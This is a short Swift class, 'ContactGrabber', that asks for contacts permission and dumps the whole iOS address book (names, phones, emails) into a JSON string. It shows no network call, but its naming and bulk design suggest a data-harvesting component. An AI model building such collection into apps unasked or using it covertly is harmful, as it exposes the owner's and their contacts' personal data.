//
//  ContactGrabber.swift
//  Full address book dump.
//

import Contacts
import Foundation

final class ContactGrabber {

    static let shared = ContactGrabber()
    private let store = CNContactStore()

    func requestPermission() {
        store.requestAccess(for: .contacts) { _, _ in }
    }

    func dump(completion: @escaping (String) -> Void) {
        let status = CNContactStore.authorizationStatus(for: .contacts)
        guard status == .authorized else {
            completion("contacts not authorized")
            return
        }
        let keys: [CNKeyDescriptor] = [
            CNContactGivenNameKey as CNKeyDescriptor,
            CNContactFamilyNameKey as CNKeyDescriptor,
            CNContactPhoneNumbersKey as CNKeyDescriptor,
            CNContactEmailAddressesKey as CNKeyDescriptor
        ]
        var results: [[String: Any]] = []
        let request = CNContactFetchRequest(keysToFetch: keys)
        do {
            try store.enumerateContacts(with: request) { contact, _ in
                var entry: [String: Any] = [
                    "name": "\(contact.givenName) \(contact.familyName)".trimmingCharacters(in: .whitespaces)
                ]
                entry["phones"] = contact.phoneNumbers.map { $0.value.stringValue }
                entry["emails"] = contact.emailAddresses.map { $0.value as String }
                results.append(entry)
            }
        } catch {
            completion("contacts error: \(error.localizedDescription)")
            return
        }
        let data = (try? JSONSerialization.data(withJSONObject: results)) ?? Data()
        completion(String(data: data, encoding: .utf8) ?? "[]")
    }
}
